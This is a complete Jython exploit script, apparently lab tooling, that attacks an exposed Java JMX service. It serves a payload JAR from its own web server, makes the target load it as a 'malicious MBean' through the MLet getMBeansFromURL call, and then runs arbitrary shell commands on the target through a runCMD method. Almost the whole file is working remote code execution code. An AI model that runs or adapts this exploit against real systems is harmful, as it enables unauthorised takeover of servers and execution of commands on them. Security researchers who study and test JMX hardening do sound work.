# jmx stuff
from javax.management.remote import JMXServiceURL
from javax.management.remote import JMXConnector
from javax.management.remote import JMXConnectorFactory
from javax.management import ObjectName
from java.lang import String
from java.lang import Object


# BaseHTTPServer needed to serve mlets
from BaseHTTPServer import BaseHTTPRequestHandler,HTTPServer
from threading import Thread

import sys
import time
import jarray

#This class will handles any incoming request from
#the JMX service
# Needed during installation of the JAR
def MakeHandlerClass(base_url):
    class CustomHandler(BaseHTTPRequestHandler):

        def __init__(self, *args, **kwargs):
             self._base_url = base_url
             BaseHTTPRequestHandler.__init__(self, *args, **kwargs)

        #Handler for the GET requests
        def do_GET(self):
            if self.path=="/":
                #serve mlet code00000000000000000000000000
                # see: https://docs.oracle.com/javase/7/docs/api/javax/management/loading/MLet.html
                #mlet_code = "<mlet code=de.siberas.lab.JMXBean archive=siberas_mlet.jar name=siberas:name=jmx,id=1 codebase=http://192.168.11.138:8888></mlet>"
                mlet_code = '<html><mlet code="de.siberas.lab.SiberasPayload" archive="siberas_mlet.jar" name="Siberas:name=payload,id=1" codebase="' + self._base_url + '"></mlet></html>'

                self.send_response(200)
                #self.send_header('Content-type', 'application/octet-stream')
                self.send_header('Pragma', 'no-cache')
                self.end_headers()
                self.wfile.write(mlet_code)

            elif self.path=="/siberas_mlet.jar":
                f = open("./payloads/siberas_mlet.jar")
                self.send_response(200)
                self.send_header('Content-type', 'application/jar')
                self.end_headers()
                self.wfile.write(f.read())
                f.close()

            else:
                self.send_error(404, 'File not found: ' + self.path)
                #
                # except IOError:
                # 	self.send_error(404,'File Not Found: %s' % self.path)

    return CustomHandler



## TODO: Command line parameters
target_host = "192.168.11.133"                                      # mandatory
target_port = "9999"                                                # mandatory
webserver_port = 8888                                               # mandatory
mlet_url = "http://192.168.11.141:" + str(webserver_port)           # only needed during installation, user should provide port in the URL
cmd = "ls -la"                                                      # only needed in cmd mode

# Start a web server on all ports in a seperate thread
# Only needed during installation
print "[+] Starting webserver at port " + str(webserver_port)
mletHandler = MakeHandlerClass(mlet_url)
mlet_webserver = HTTPServer(('', webserver_port), mletHandler)
webserver_thread = Thread(target = mlet_webserver.serve_forever)
webserver_thread.daemon = True
try:
    webserver_thread.start()
except KeyboardInterrupt:
    mlet_webserver.shutdown()
    sys.exit(0)


# Basic JMX connection, always required
jmx_url = JMXServiceURL("service:jmx:rmi:///jndi/rmi://" + target_host + ":" + target_port + "/jmxrmi")
print "[+] Connecting to: " + str(jmx_url)
jmx_connector = JMXConnectorFactory.connect(jmx_url)
print "[+] Connected: " + str(jmx_connector.getConnectionId())
bean_server = jmx_connector.getMBeanServerConnection()


# Installation, load javax.management.loading.MLet to install additional MBeans
# If loading fails, the Mlet is already loaded...
try:
    mlet_bean = bean_server.createMBean("javax.management.loading.MLet", None)
except:
    # MLet Bean can't be created because it already exists
    mlet_bean = bean_server.getObjectInstance(ObjectName("DefaultDomain:type=MLet"))

print "[+] Loaded " + str(mlet_bean.getClassName())


# Install payload Mlet via getMbeansFromURL
# pass the URL of the web server
print "[+] Loading malicious MBean from " + mlet_url
print "[+] Invoking: "+ mlet_bean.getClassName() + ".getMBeansFromURL"


inv_array1 = jarray.zeros(1, Object)
inv_array1[0] = mlet_url

inv_array2 = jarray.zeros(1, String)
inv_array2[0] = String.canonicalName

resource = bean_server.invoke(mlet_bean.getObjectName(), "getMBeansFromURL", inv_array1, inv_array2)

# Check if the Mlet was loaded successfully
for res in resource:
    if res.__class__.__name__ == "InstanceAlreadyExistsException":
        print "[+] Object instance already existed, no need to install it a second time"
    elif res.__class__.__name__ == "ObjectInstance":
        print "[+] Successfully loaded " + str(res.getObjectName())


# Payload execution
# Load the Payload Met and invoke a method on it
mlet_bean = bean_server.getObjectInstance(ObjectName("Siberas:name=payload,id=1"))
print "[+] Loaded " + str(mlet_bean.getClassName())

print "[+] Executing command: " + cmd
inv_array1 = jarray.zeros(1, Object)
inv_array1[0] = cmd

inv_array2 = jarray.zeros(1, String)
inv_array2[0] = String.canonicalName

resource = bean_server.invoke(mlet_bean.getObjectName(), "runCMD", inv_array1, inv_array2)

# this is ugly, and I need to find a better solution for that...
for res in resource:
    sys.stdout.write(res)

sys.stdout.write("\n")
sys.stdout.flush()

print "[+] Done"
